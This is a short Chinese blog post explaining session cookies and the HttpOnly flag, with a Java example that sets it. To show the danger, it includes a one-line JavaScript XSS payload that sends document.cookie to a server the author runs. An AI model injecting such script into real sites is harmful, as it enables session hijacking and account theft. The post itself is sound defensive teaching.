---
title: HttpOnly详解
url: What_is_HttpOnly
tags:
  - Cookie
categories:
  - 编程杂谈
date: 2018-03-27 11:10:04
---

# 前言
`Http`连接是无状态的, 也就是说, 即使你发送第一次`Http`请求, 传了个`param`参数给`Web`服务器。第二次`Http`请求想获取`param`参数, 是获取不到的, 因为`Web`服务器是不认识你的。
为了完成这个需求, 我们可以使用`Cookie`和`Session`进行存储数据, 在`Cookie`中存入本次会话的`SessionID`, 那`Web`服务器从`Cookie`中获取`SessionID`就可以知道你是哪个用户, 知道你之前存了什么数据。

<!-- more -->

# 危险
我们知道`Cookie`是明文存储的, 甚至就算是小白用户, 也可以通过浏览器直接查看。那么如果小明知道了小红的`Cookie`里的用户凭证, 然后将自己的`Cookie`的用户凭证改为小红的用户凭证, 那不就可以看到小红的信息了? 

# HttpOnly
比如我自己搭建一个服务器`http://localhost:8080`, 然后在要窃取`Cookie`页面按下`F12`打开`Console`控制台执行下面代码(`XSS`攻击)

```js
window.open('http://localhost:8080?c='+document.cookie);
```

就可以将`Cookie`发送到我们自己的服务器。

那么, 只要不让`document`获取到敏感`Cookie`就好了。
为`Cookie`设置`HttpOnly`, 禁止`js`获取。

```java
@RequestMapping("/test")
public String test(HttpServletResponse response){
    Cookie cookie = new Cookie("key1", "value1");
    cookie.setHttpOnly(true); // 设置HttpOnly
    response.addCookie(cookie);
    return "test.jsp"
}
```

# 参考资料
- [关于cookie的安全性问题](https://segmentfault.com/q/1010000007347730)